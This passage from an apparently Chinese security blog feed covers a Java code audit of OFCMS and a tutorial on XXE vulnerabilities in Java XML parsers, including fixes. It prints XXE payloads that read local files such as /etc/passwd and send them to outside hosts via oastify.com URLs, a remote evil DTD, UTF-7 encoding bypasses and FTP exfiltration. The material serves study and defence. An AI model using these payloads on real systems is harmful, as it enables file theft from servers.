dataSource.getConnection());<br></code></pre></td></tr></table></figure><p>此段代码可能对文件内容有控制</p><p>跟进compileReport函数</p><p>compileReport-&gt;compile-&gt;JRXmlLoader.load-&gt;xmlLoader.loadXML-&gt;digester.parse(反序列化)</p><p>compile方法</p><p><img src="/img/ofcms/ofcms22.png"></p><p>xmlLoader.loadXML</p><p>此方法主要是将 <code>.jrxml</code> 报表模板文件从 InputStream 中读取，使用 SAX 解析方式转换为 JasperDesign 报表设计对象<img src="/img/ofcms/ofcms23.png"></p><p>可以看到代码中并没有禁用外部实体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 不支持外部实体</span><br>xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, <span class="hljs-literal">false</span>);<br><span class="hljs-comment">// 不支持dtd</span><br>xif.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><p>开始测试</p><p>利用前面发现的文件上传漏洞上传一个jrxml为后缀的文件</p><p>文件内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///E:/1.txt&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">eval</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://3qu6uz9jay9cbyrfh9d0wtxmndt4h25r.oastify.com/?x=%file;&#x27;&gt;&quot;</span>&gt;</span><br>%eval;<br>%exfil;<br><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">abc</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://127.0.0.1:7777&quot;</span>&gt;</span>&amp;xxe; ]&gt;</span><br></code></pre></td></tr></table></figure><p>看到成功上传</p><p><img src="/img/ofcms/ofcms24.png"></p><p>访问url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/ofcms_admin_war/admin/reprot/expReport.html?j=../../static/1<br></code></pre></td></tr></table></figure><p><img src="/img/ofcms/ofcms25.png"></p><p>但是换了很多dns平台都没有访问记录，不知道为什么</p><h4 id="参数未过滤-误报"><a href="#参数未过滤-误报" class="headerlink" title="参数未过滤(误报)"></a>参数未过滤(误报)</h4><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;cms&#x2F;ContentController.java</p><p>第二条关于sql注入漏洞的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        List&lt;Record&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Record&gt;();<br>        Map&lt;String, Object&gt; params = getParamsMap();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//修改内容</span><br>            <span class="hljs-type">Record</span> <span class="hljs-variable">record</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Record</span>();<br>            record.set(<span class="hljs-string">&quot;title_name&quot;</span>, params.get(<span class="hljs-string">&quot;title_name&quot;</span>));<br>            record.set(<span class="hljs-string">&quot;content_id&quot;</span>, params.get(<span class="hljs-string">&quot;content_id&quot;</span>));<br>            Db.update(<span class="hljs-string">&quot;of_cms_content&quot;</span>, <span class="hljs-string">&quot;content_id&quot;</span>,record);<br>            <span class="hljs-comment">//组装参数</span><br>            <span class="hljs-keyword">for</span> (String key : params.keySet()) &#123;<br>                list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Record</span>().set(<span class="hljs-string">&quot;name&quot;</span>,key).set(<span class="hljs-string">&quot;value&quot;</span>, params.get(key).toString()).set(<span class="hljs-string">&quot;content_id&quot;</span>, params.get(<span class="hljs-string">&quot;content_id&quot;</span>)));<br>            &#125;<br>            <span class="hljs-comment">//批量修改</span><br>            Db.batchUpdate(<span class="hljs-string">&quot;of_cms_content_field&quot;</span>,<span class="hljs-string">&quot;content_id,name&quot;</span>,list, list.size());<br><br>            rendSuccessJson();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            rendFailedJson(ErrorCode.get(<span class="hljs-string">&quot;9999&quot;</span>));<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>扫描呈现出此代码有漏洞的原因是工具中程序认定params中参数未过滤，但是实际通过此参数无法注入恶意数据完成字符串拼接</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>java代码审计工具初始配置下不如php完善，很多漏洞需要手动查找(准备多换几个工具试试)</li><li>要黑白盒结合审计，在网站寻找功能点再对应源码测试</li><li>手动搜索特殊函数与关键字对搜索结果做筛选找漏洞</li></ol>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>CMS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计中的XXE</title>
    <link href="/2025/07/13/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84XXE/"/>
    <url>/2025/07/13/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84XXE/</url>
    
    <content type="html"><![CDATA[<h2 id="Java代码审计中的XXE"><a href="#Java代码审计中的XXE" class="headerlink" title="Java代码审计中的XXE"></a>Java代码审计中的XXE</h2><p>感觉第一次学到xxe这个漏洞时学的不是很好，现在再来深入学习一下</p><p>参考：<a href="https://drun1baby.top/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">Java OWASP 中的 XXE 代码审计 | Drunkbaby’s Blog (drun1baby.top)</a></p><p>​  <a href="https://blog.csdn.net/qq_48201589/article/details/136421867">【Java代码审计】XXE_java xxe-CSDN博客</a></p><p>​<a href="https://www.freebuf.com/articles/web/318984.html">WEB安全&amp;JAVA代码审计：XXE外部实体注入 - FreeBuf网络安全行业门户</a></p><p>代码审计基于此项目：<a href="https://github.com/JoyChou93/java-sec-code?tab=readme-ov-file">JoyChou93&#x2F;java-sec-code</a></p><h3 id="XML文档的格式与结构"><a href="#XML文档的格式与结构" class="headerlink" title="XML文档的格式与结构"></a>XML文档的格式与结构</h3><p><a href="https://www.freebuf.com/articles/web/318984.html">WEB安全&amp;JAVA代码审计：XXE外部实体注入 - FreeBuf网络安全行业门户</a></p><p>关于DTD：<a href="https://xz.aliyun.com/news/14107">JAVA XXE 从原理到利用-先知社区 (aliyun.com)</a></p><h3 id="判断XXE漏洞存在"><a href="#判断XXE漏洞存在" class="headerlink" title="判断XXE漏洞存在"></a>判断XXE漏洞存在</h3><ol><li>观察发送数据包中数据是否是xml格式</li><li>搜索处理XML文档相关的类与接口</li><li>开始测试，尝试是否能顺利访问DNS平台留下记录</li></ol><h3 id="审计中常见的类-接口"><a href="#审计中常见的类-接口" class="headerlink" title="审计中常见的类&#x2F;接口"></a>审计中常见的类&#x2F;接口</h3><p>xml文件的解析可用到的解析器有四种，对应不同的写法以及解析包</p><p>详细比较：<a href="https://blog.csdn.net/2501_90253336/article/details/145215020">Java进阶(五十一)XML 四种解析器(dom,sax,jdom,dom4j)原理及性能比较 java xml解析工具_java jdom-CSDN博客</a></p><h4 id="XMLReader-接口"><a href="#XMLReader-接口" class="headerlink" title="XMLReader(接口)"></a>XMLReader(接口)</h4><p>XMLReader接口是一种通过回调读取XML文档的接口，其存在于公共区域中。XMLReader接口是XML解析器实现SAX2驱动程序所必需的接口，其允许应用程序设置和查询解析器中的功能和属性、注册文档处理的事件处理程序，以及开始文档解析。当XMLReader使用默认的解析方法并且未对XML进行过滤时，会出现XXE漏洞</p><h4 id="SAXBuilder"><a href="#SAXBuilder" class="headerlink" title="SAXBuilder"></a>SAXBuilder</h4><p>SAXBuilder 是一个 JDOM 解析器，其能够将路径中的 XML 文件解析为 Document 对象。SAXBuilder 使用第三方 SAX 解析器来处理解析任务，并使用SAXHandler的实例侦听 SAX 事件。当SAXBuilder使用默认的解析方法并且未对XML进行过滤时，会出现 XXE 漏洞</p><h4 id="SAXReader"><a href="#SAXReader" class="headerlink" title="SAXReader"></a>SAXReader</h4><p>DOM4J是dom4j.org出品的一个开源XML解析包，使用起来非常简单，只要了解基本的XML-DOM模型，就能使用。DOM4J读&#x2F;写XML文档主要依赖于org.dom4j.io包，它有DOMReader和SAXReader两种方式。因为使用了同一个接口，所以这两种方式的调用方法是完全一致的。同样的，在使用默认解析方法并且未对XML进行过滤时，其也会出现XXE漏洞。</p><h4 id="SAXParserFactory"><a href="#SAXParserFactory" class="headerlink" title="SAXParserFactory"></a>SAXParserFactory</h4><p>SAXParserFactory使应用程序能够配置和获取基于SAX的解析器以解析XML文档。其受保护的构造方法，可以强制使用newInstance()。跟上面介绍的一样，在使用默认解析方法且未对XML进行过滤时，其也会出现XXE漏洞。</p><h4 id="Digester"><a href="#Digester" class="headerlink" title="Digester"></a>Digester</h4><p>Digester类用来将XML映射成Java类，以简化XML的处理。它是Apache Commons库中的一个jar包：common-digester包。一样的在默认配置下会出现XXE漏洞。其触发的XXE漏洞是没有回显的，我们一般需通过Blind XXE的方法来利用</p><h4 id="DocumentBuilderFactory"><a href="#DocumentBuilderFactory" class="headerlink" title="DocumentBuilderFactory"></a>DocumentBuilderFactory</h4><p>javax.xml.parsers包中的DocumentBuilderFactory用于创建DOM模式的解析器对象，DocumentBuilderFactory是一个抽象工厂类，它不能直接实例化，但该类提供了一个newInstance()方法，这个方法会根据本地平台默认安装的解析器，自动创建一个工厂的对象并返回。</p><p>由上述类与接口的功能与配置写法可知，如果使用默认的写法，一般都是会造成xxe漏洞的</p><p>需要使用安全写法或手动过滤</p><h3 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h3><p>最开始我们看到的 XMLReader 代码，以及其他的 xxxReader 代码，都是不回显的，因为它们只是对内容进行了解析，但是并没有对内容进行读取与输出。</p><ul><li>因为 XML 也是反序列化的一种，例如平常的 <code>Runtime.getRuntime.exe()</code> 是没有回显的，如果要有回显，必须要写 <code>byte[] code = ...</code> 这样子，把最后的结果读取出来。</li></ul><h4 id="DocumentBuilder-XXE"><a href="#DocumentBuilder-XXE" class="headerlink" title="DocumentBuilder XXE"></a>DocumentBuilder XXE</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">DocumentBuilderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>            <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> dbf.newDocumentBuilder();<br>            <span class="hljs-type">InputSource</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(request.getInputStream());<br>            <span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> db.parse(is);  <span class="hljs-comment">// parse xml</span><br><br>            <span class="hljs-comment">// 遍历xml节点name和value</span><br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            <span class="hljs-type">NodeList</span> <span class="hljs-variable">rootNodeList</span> <span class="hljs-operator">=</span> document.getChildNodes();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;<br>                <span class="hljs-type">Node</span> <span class="hljs-variable">rootNode</span> <span class="hljs-operator">=</span> rootNodeList.item(i);<br>                <span class="hljs-type">NodeList</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> rootNode.getChildNodes();<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; child.getLength(); j++) &#123;<br>                    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> child.item(j);<br>                    buf.append(String.format(<span class="hljs-string">&quot;%s: %s\n&quot;</span>, node.getNodeName(), node.getTextContent()));<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> buf.toString();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            logger.error(e.toString());<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">Drunkbaby</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///E:/1.txt&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里环境搭建出了一些问题，流程分析就不动态调试了，手动追踪一下代码执行流程</p><p>在此列出一些比较重要的代码释义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">DocumentBuilderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br></code></pre></td></tr></table></figure><p>定义了一个名为 <code>DocumentBuilderVuln</code> 的方法，接收 <code>HttpServletRequest</code> 对象作为参数，返回一个字符串。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br></code></pre></td></tr></table></figure><p>创建一个新的 XML 解析器工厂对象。</p><p><code>DocumnetBuilderFactory</code> 类用 <code>newInstance()</code> 的方式进行实例化。本身抽象类是不可以实例化的，但是 <code>DocumnetBuilderFactory</code> 自己定义了一个 <code>newInstance()</code> 实例化的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> dbf.newDocumentBuilder();<br></code></pre></td></tr></table></figure><p>从工厂中生成一个 XML 解析器（DocumentBuilder）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InputSource</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(request.getInputStream());<br></code></pre></td></tr></table></figure><p>将 HTTP 请求体作为输入流传入，用于解析 XML 数据，就是读入数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> db.parse(is);  <span class="hljs-comment">// parse xml</span><br></code></pre></td></tr></table></figure><p>解析 XML 数据，生成一个 DOM 树结构的 <code>Document</code> 对象。开始反序列化操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> buf.toString();<br></code></pre></td></tr></table></figure><p>最终可以看到调用了toString()方法，<mark>返回了拼好的字符串</mark>，所以这个方法是有回显的,能够用来读取一些文件内容</p><h3 id="无回显的XXE"><a href="#无回显的XXE" class="headerlink" title="无回显的XXE"></a>无回显的XXE</h3><p>返回包中是看不到字符串回显的</p><p>一般使用DNS检测来打无回显</p><h4 id="XMLReader，SAXBuilder，SAXReader，SAXParser，Digester-这几个函数都是无回显的"><a href="#XMLReader，SAXBuilder，SAXReader，SAXParser，Digester-这几个函数都是无回显的" class="headerlink" title="XMLReader，SAXBuilder，SAXReader，SAXParser，Digester 这几个函数都是无回显的"></a>XMLReader，SAXBuilder，SAXReader，SAXParser，Digester 这几个函数都是无回显的</h4><p>测试xxe漏洞是否存在只需要使用DNS检测即可</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">admin</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://zehfrya24b6tjn2oz8w00x6pegk784wt.oastify.com&quot;</span>&gt;</span> ]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>漏洞利用(利用dns外带数据)</p><p>将一个恶意的DTD放在自己的vps上</p><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///E:/1.txt&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">eval</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://pg9ydrnt7kzybog1jz9hyjmtuk0aoz.oastify.com/?x=%file;&#x27;&gt;&quot;</span>&gt;</span><br>%eval;<br>%exfil;<br></code></pre></td></tr></table></figure><p>它将读取本地文件 <code>E:/1.txt</code>。</p><p>然后访问如下 URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://pg9ydrnt7kzybog1jz9hyjmtuk0aoz.oastify.com/?x=&lt;文件内容&gt;<br></code></pre></td></tr></table></figure><p>文件内容就这样泄露到了攻击者控制的域名。</p><ul><li>原理上来说是这样的：</li></ul><p>有时候如果 xxe 当中如果服务端没有正确处理好使用 try catch，那么如果抛出异常 Web 界面通常会显示这个错误，所以我们可以如此攻击。</p><p>之前实操的时候是能看到网页回显是有报错的，但是dns平台有记录</p><p>发包攻击</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">admin</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY %remote <span class="hljs-keyword">SYSTEM</span> </span></span><br><span class="hljs-meta"><span class="hljs-meta"><span class="hljs-string">&quot;http://vps地址/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta"> %remote;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>攻击顺利是能看到返回的dns记录中url参数中有x&#x3D;…(文件内容)</p><p>这里环境调试出了一些问题，很遗憾没有看到成功的dns外带数据</p><h3 id="XXE漏洞的修复"><a href="#XXE漏洞的修复" class="headerlink" title="XXE漏洞的修复"></a>XXE漏洞的修复</h3><p>修复的手段主要就是一种：禁用外部实体 DTD。对于不同的解析器有不同的修复手段。</p><p>(外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，禁止外部实体，防止外部恶意文件加载)</p><p>关键语句就是这两句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">var</span> <span class="hljs-variable">xif</span> <span class="hljs-operator">=</span> XMLInputFactory.newInstance();<br>        <span class="hljs-comment">// 不支持外部实体</span><br>       <span class="hljs-comment">// 后面两行是多加的代码 </span><br>        xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// 不支持dtd</span><br>        xif.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><h3 id="绕过手法与trick"><a href="#绕过手法与trick" class="headerlink" title="绕过手法与trick"></a>绕过手法与trick</h3><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>utf7</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-7&quot;</span> ?&gt;</span><br>+ADwAIQ-DOCTYPE ANY +AFs-<br>  +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-<br>+AF0APg-<br>+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-<br></code></pre></td></tr></table></figure><h4 id="Java-XML-DTD-的-trick-利用"><a href="#Java-XML-DTD-的-trick-利用" class="headerlink" title="Java XML DTD 的 trick 利用"></a>Java XML DTD 的 trick 利用</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">evil</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///&quot;</span> &gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;!ENTITY send SYSTEM &#x27;netdoc://%evil;&#x27;&gt;&quot;</span>&gt;</span><br>%print;<br></code></pre></td></tr></table></figure><h4 id="解决文件跨行传输——-ftp-jdk1-7"><a href="#解决文件跨行传输——-ftp-jdk1-7" class="headerlink" title="解决文件跨行传输—— ftp&amp;jdk1.7+"></a>解决文件跨行传输—— ftp&amp;jdk1.7+</h4><p>看到这部分的时候觉得好厉害，居然还可以这样做</p><p>在 XXE 盲注中，通过 http 协议访问我们的服务器会只获取被读取的文件第一行。</p><p>在 jdk1.7 以前，可以通过http协议传输具有换行的文件的。因为java会对换行符进行URL编码然后就访问一个地址。</p><p>但是1.7之后，就修复了这个问题，会报错。</p><p>但是我们仍然可以用ftp服务器来接受换行文件，因为ftp没有进行类似的限制，换行之后的字符会被当做CWD命令输入。</p><p>需要起一个<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb">恶意的FTP服务器</a>，其他按照正常的XXE盲注打。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs XMl"><span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % c <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &#x27;ftp://127.0.0.1:2121/%b;&#x27;&gt;&quot;</span>&gt;</span><br>%c;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">asd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps:8088/&quot;</span>&gt;</span> </span><br><span class="hljs-meta">   %asd; </span><br><span class="hljs-meta">   %rrr; </span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>启动ftp-server</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 